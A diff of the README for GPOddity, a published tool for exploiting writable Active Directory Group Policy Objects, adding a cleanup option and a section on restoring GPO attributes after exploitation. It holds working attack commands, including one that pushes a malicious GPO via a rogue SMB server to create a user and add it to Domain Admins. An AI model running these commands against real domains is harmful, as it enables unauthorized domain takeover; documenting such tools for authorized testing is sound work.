@@ -11,7 +11,7 @@ https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos
 You can install GPOddity through pipx with the following command:
 
 ```
-python3 -m pipx install git+https://github.com/synacktiv/GPOddity
+$ python3 -m pipx install git+https://github.com/synacktiv/GPOddity
 ```
 
 ## Manual
@@ -34,8 +34,8 @@ $ python3 gpoddity.py --help
 │ --help          Show this message and exit.                                                                                                                                                                     │
 ╰─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
 ╭─ General options ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
-│ *  --gpo-id               TEXT  The GPO object GUID without enclosing brackets (for instance, '1328149E-EF37-4E07-AC9E-E35920AD2F59') [default: None] [required]                                                │
 │ *  --domain               TEXT  The target domain [default: None] [required]                                                                                                                                    │
+│ *  --gpo-id               TEXT  The GPO object GUID without enclosing brackets (for instance, '1328149E-EF37-4E07-AC9E-E35920AD2F59') [default: None] [required]                                                │
 │ *  --username             TEXT  The username of the user having write permissions on the GPO AD object. This may be a machine account (for instance, 'SRV01$') [default: None] [required]                       │
 │    --password             TEXT  The password of the user having write permissions on the GPO AD object [default: None]                                                                                          │
 │    --hash                 TEXT  The NTLM hash of the user having write permissions on the GPO AD object, with the format 'LM:NT' [default: None]                                                                │
@@ -43,8 +43,10 @@ $ python3 gpoddity.py --help
 │    --ldaps                      [Optional] Use LDAPS on port 636 instead of LDAP                                                                                                                                │
 │    --verbose                    [Optional] Enable verbose output                                                                                                                                                │
 │    --no-smb-server              [Optional] Disable the smb server feature. GPOddity will only generate a malicious GPT, spoof the GPO location, wait, and cleanup                                               │
-│    --just-clean                 [Optional] Only perform cleaning action from the values specified in the 'cleaning/to_clean.txt' file. May be useful to clean up in case of incomplete exploitation or          │
+│    --just-clean                 [Optional] Only perform cleaning action from the values specified in the file of the --clean-file flag. May be useful to clean up in case of incomplete exploitation or         │
 │                                 ungraceful exit                                                                                                                                                                 │
+│    --clean-file           TEXT  [Optional] The file from the 'cleaning/' folder containing the values to restore when using --just-clean flag. Relative path from GPOddity install folder, or absolute path     │
+│                                 [default: None]                                                                                                                                                                 │
 ╰─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
 ╭─ Malicious Group Policy Template generation options ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
 │ --command           TEXT             The command that should be executed through the malicious GPO [default: None]                                                                                              │
@@ -83,7 +85,21 @@ $ python3 gpoddity.py --gpo-id '46993522-7D77-4B59-9B77-F82082DE9D81' --domain '
 
 > Exploiting a User GPO to add a domain administrator (no embedded SMB server).
 ```
-python3 gpoddity.py --gpo-id '7B36419B-B566-46FA-A7B7-58CA9030A604' --gpo-type 'user' --no-smb-server --domain 'corp.com' --username 'GPODDITY$' --password '[...]' --command 'net user user_gpo Password123! /add /domain && net group "Domain Admins" user_gpo /ADD /DOMAIN' --rogue-smbserver-ip '192.168.58.102' --rogue-smbserver-share 'synacktiv'
+$ python3 gpoddity.py --gpo-id '7B36419B-B566-46FA-A7B7-58CA9030A604' --gpo-type 'user' --no-smb-server --domain 'corp.com' --username 'GPODDITY$' --password '[...]' --command 'net user user_gpo Password123! /add /domain && net group "Domain Admins" user_gpo /ADD /DOMAIN' --rogue-smbserver-ip '192.168.58.102' --rogue-smbserver-share 'synacktiv'
+```
+
+# About cleaning
+
+One of the advantages of using GPOddity resides in the possibility to safely exploit GPOs, without altering legitimate GPT files, thus minimizing disruption risks in production environments. However, GPOddity still has to modify some attributes of the Group Policy Container files in order to temporarily spoof the GPT location. As a result, ensuring that the production environment remains functional supposes to revert those changes after exploitation.
+
+By default and as explained in the article, GPOddity will do it for you by reverting any alteration performed on the GPC at the end of the exploit, when the user interrupts the program with CTRL+C. As a result, in standard conditions, you do not need to do anything to ensure everything is cleaned up.
+
+However, if for some reason you are not able to exit GPOddity gracefully through a CTRL+C (process killed, network connection lost etc.), you can launch GPOddity with the '--just-clean' flag to perform cleaning actions in an independent manner.
+
+This feature works in the following way. Each time GPOddity is run, the initial state of the GPO will be saved in a file under the path `cleaning/[GPO ID]/[timestamp].txt`. You can then restore all the values contained in this save file through the '--just-clean' flag. For instance, assume that you want to restore all the attributes of the GPO with ID '46993522-7D77-4B59-9B77-F82082DE9D81' to their values before running GPOddity on the 14th October 2023 at 08:08:44. You may run the following command:
+
+```
+$ python3 gpoddity.py --just-clean --domain 'corp.com' --gpo-id '46993522-7D77-4B59-9B77-F82082DE9D81' --username 'GPODDITY$' --password '[...]' --clean-file cleaning/46993522-7D77-4B59-9B77-F82082DE9D81/2023_10_14-08_08_44.txt
 ```
 
 # Video demonstration
